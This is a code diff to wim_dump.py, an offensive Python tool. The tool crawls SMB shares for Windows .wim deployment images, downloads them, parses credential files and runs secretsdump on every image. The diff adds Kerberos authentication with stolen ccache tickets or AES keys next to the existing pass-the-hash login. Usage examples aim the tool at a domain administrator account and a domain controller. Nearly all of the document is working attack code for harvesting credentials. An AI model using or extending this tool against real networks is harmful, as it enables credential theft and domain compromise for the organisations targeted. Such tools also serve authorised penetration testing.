@@ -23,6 +23,15 @@ Usage:
     python3 wim_dump.py --search 192.168.1.10 \
         -u DOMAIN\\administrator -p 'Password1'
 
+    # Kerberos auth via ccache (e.g. from getTGT.py / getST.py):
+    KRB5CCNAME=admin.ccache python3 wim_dump.py \
+        \\\\dc01.corp.local\\deploy\\images\\capture.wim \
+        -u administrator -k --no-pass --dc-ip 10.0.0.1
+
+    # With AES key directly:
+    python3 wim_dump.py --search dc01.corp.local \
+        -u administrator -k --aes-key <hex> --dc-ip 10.0.0.1
+
 Dependencies:
     apt install wimtools          # provides wimlib-imagex
     pip install impacket          # provides secretsdump
@@ -151,11 +160,10 @@ def parse_unc(unc: str):
 
 
 def smb_download(host, share, remote_path, local_path, username, password,
-                 domain, nthash):
-    lmhash = "aad3b435b51404eeaad3b435b51404ee" if nthash else ""
+                 domain, nthash, kerberos=False, dc_ip="", aes_key=""):
     print(f"[*] Connecting to {host} …")
-    conn = SMBConnection(host, host, sess_port=445)
-    conn.login(username, password, domain, lmhash, nthash)
+    conn = _smb_login(host, username, password, domain, nthash,
+                      kerberos, dc_ip, aes_key)
     print(f"[+] Authenticated as {domain}\\{username}")
     print(f"[*] Downloading {share}{remote_path} …")
     total = [0]
@@ -173,11 +181,25 @@ def smb_download(host, share, remote_path, local_path, username, password,
 
 # ── share crawl / .wim search ─────────────────────────────────────────────────
 
-def smb_connect(host, username, password, domain, nthash):
-    lmhash = "aad3b435b51404eeaad3b435b51404ee" if nthash else ""
-    conn = SMBConnection(host, host, sess_port=445)
-    conn.login(username, password, domain, lmhash, nthash)
+def _smb_login(host, username, password, domain, nthash,
+               kerberos=False, dc_ip="", aes_key="", target_ip=""):
+    remote = target_ip or host
+    conn = SMBConnection(host, remote, sess_port=445)
+    if kerberos:
+        conn.kerberosLogin(username, password, domain,
+                           lmhash="", nthash=nthash or "",
+                           aesKey=aes_key or "",
+                           kdcHost=dc_ip or None)
+    else:
+        lmhash = "aad3b435b51404eeaad3b435b51404ee" if nthash else ""
+        conn.login(username, password, domain, lmhash, nthash)
     return conn
+
+
+def smb_connect(host, username, password, domain, nthash,
+                kerberos=False, dc_ip="", aes_key=""):
+    return _smb_login(host, username, password, domain, nthash,
+                      kerberos, dc_ip, aes_key)
 
 
 def list_readable_shares(conn, skip_shares=SKIP_SHARES):
@@ -212,7 +234,8 @@ def is_noise_wim(share, full_path):
 
 
 def crawl_share_for_wim(share, host, username, password, domain, nthash,
-                        max_depth=25, start_path=""):
+                        max_depth=25, start_path="",
+                        kerberos=False, dc_ip="", aes_key=""):
     """
     Recursively walk a single share looking for .wim files. Opens its own
     SMB connection so it can run in its own worker thread independent of
@@ -226,7 +249,8 @@ def crawl_share_for_wim(share, host, username, password, domain, nthash,
     """
     found = []
     seen_dirs = set()
-    conn = smb_connect(host, username, password, domain, nthash)
+    conn = smb_connect(host, username, password, domain, nthash,
+                       kerberos, dc_ip, aes_key)
 
     def walk(rel_path, depth):
         if depth > max_depth or rel_path in seen_dirs:
@@ -262,9 +286,11 @@ def crawl_share_for_wim(share, host, username, password, domain, nthash,
 
 
 def search_host_for_wims(host, username, password, domain, nthash,
-                         threads=8, skip_shares=SKIP_SHARES):
+                         threads=8, skip_shares=SKIP_SHARES,
+                         kerberos=False, dc_ip="", aes_key=""):
     print(f"[*] Connecting to {host} for share enumeration …")
-    conn = smb_connect(host, username, password, domain, nthash)
+    conn = smb_connect(host, username, password, domain, nthash,
+                       kerberos, dc_ip, aes_key)
     print(f"[+] Authenticated as {domain}\\{username}")
 
     print(f"\n[*] Enumerating shares on {host} …")
@@ -280,7 +306,8 @@ def search_host_for_wims(host, username, password, domain, nthash,
     with ThreadPoolExecutor(max_workers=min(threads, len(shares))) as pool:
         futures = {
             pool.submit(crawl_share_for_wim, share, host, username, password,
-                       domain, nthash): share
+                       domain, nthash, kerberos=kerberos, dc_ip=dc_ip,
+                       aes_key=aes_key): share
             for share in shares
         }
         for fut in as_completed(futures):
@@ -293,17 +320,13 @@ def search_host_for_wims(host, username, password, domain, nthash,
     return all_found
 
 
-def search_path_for_wims(host, share, start_path, username, password, domain, nthash):
-    """
-    Crawl a single, caller-specified share (optionally starting at a subpath)
-    for .wim files, skipping share enumeration entirely. Used by --search-path
-    when the target share is already known and a full --search of every share
-    on the host would be slow or noisy.
-    """
+def search_path_for_wims(host, share, start_path, username, password, domain,
+                         nthash, kerberos=False, dc_ip="", aes_key=""):
     where = f"\\\\{host}\\{share}" + (start_path if start_path else "")
     print(f"[*] Crawling {where} for .wim files …")
     found = crawl_share_for_wim(share, host, username, password, domain, nthash,
-                               start_path=start_path)
+                               start_path=start_path, kerberos=kerberos,
+                               dc_ip=dc_ip, aes_key=aes_key)
     return found
 
 
@@ -692,6 +715,14 @@ def main():
     ap.add_argument("--hash", dest="nthash", default="",
                     help="NT hash for pass-the-hash")
     ap.add_argument("--domain", default="")
+    ap.add_argument("-k", "--kerberos", action="store_true",
+                    help="Use Kerberos authentication (ccache from KRB5CCNAME)")
+    ap.add_argument("--dc-ip", default="",
+                    help="IP of the domain controller (KDC) for Kerberos")
+    ap.add_argument("--aes-key", default="",
+                    help="AES key for Kerberos authentication (128 or 256 bits)")
+    ap.add_argument("--no-pass", action="store_true",
+                    help="Don't ask for password (use with -k)")
     ap.add_argument("--image-index", type=int, default=0,
                     help="Scan a single image index only (default: all images)")
     ap.add_argument("--out", default="",
@@ -703,6 +734,8 @@ def main():
     username, domain = args.username, args.domain
     if "\\" in username:
         domain, username = username.split("\\", 1)
+    if args.no_pass and not args.password:
+        args.password = ""
 
     if not args.search and not args.search_path and not args.wim_unc:
         ap.error("wim_unc is required unless --search/-s or --search-path is used")
@@ -721,7 +754,10 @@ def main():
         found = search_host_for_wims(args.search, username, args.password,
                                      domain, args.nthash,
                                      threads=args.threads,
-                                     skip_shares=skip_shares)
+                                     skip_shares=skip_shares,
+                                     kerberos=args.kerberos,
+                                     dc_ip=args.dc_ip,
+                                     aes_key=args.aes_key)
         if not found:
             sys.exit("[!] No .wim files found on any readable share.")
 
@@ -739,7 +775,9 @@ def main():
                            username=username, password=args.password,
                            domain=domain, nthash=args.nthash,
                            image_index=args.image_index,
-                           out_dir=image_out_dir, wimlib=wimlib)
+                           out_dir=image_out_dir, wimlib=wimlib,
+                           kerberos=args.kerberos, dc_ip=args.dc_ip,
+                           aes_key=args.aes_key)
                 processed.add(selected_unc)
         return
 
@@ -752,7 +790,10 @@ def main():
         host, share = parts[0], parts[1]
         start_path = "\\" + parts[2].replace("/", "\\") if len(parts) == 3 else ""
         found = search_path_for_wims(host, share, start_path, username,
-                                     args.password, domain, args.nthash)
+                                     args.password, domain, args.nthash,
+                                     kerberos=args.kerberos,
+                                     dc_ip=args.dc_ip,
+                                     aes_key=args.aes_key)
         if not found:
             sys.exit("[!] No .wim files found under the given share/path.")
 
@@ -770,7 +811,9 @@ def main():
                            username=username, password=args.password,
                            domain=domain, nthash=args.nthash,
                            image_index=args.image_index,
-                           out_dir=image_out_dir, wimlib=wimlib)
+                           out_dir=image_out_dir, wimlib=wimlib,
+                           kerberos=args.kerberos, dc_ip=args.dc_ip,
+                           aes_key=args.aes_key)
                 processed.add(selected_unc)
         return
 
@@ -779,11 +822,14 @@ def main():
                username=username, password=args.password,
                domain=domain, nthash=args.nthash,
                image_index=args.image_index,
-               out_dir=out_dir, wimlib=wimlib)
+               out_dir=out_dir, wimlib=wimlib,
+               kerberos=args.kerberos, dc_ip=args.dc_ip,
+               aes_key=args.aes_key)
 
 
 def process_wim(wim_unc, no_download, username, password, domain, nthash,
-                image_index, out_dir, wimlib):
+                image_index, out_dir, wimlib,
+                kerberos=False, dc_ip="", aes_key=""):
     """Acquire (if needed) and fully process a single .wim: extract, parse
     credential files, and run secretsdump against every image inside it."""
 
@@ -798,7 +844,8 @@ def process_wim(wim_unc, no_download, username, password, domain, nthash,
         host, share, remote_path = parse_unc(wim_unc)
         wim_local = os.path.join(out_dir, "capture.wim")
         smb_download(host, share, remote_path, wim_local,
-                     username, password, domain, nthash)
+                     username, password, domain, nthash,
+                     kerberos, dc_ip, aes_key)
 
     # ── list images ──
     images = wim_list_images(wim_local, wimlib)
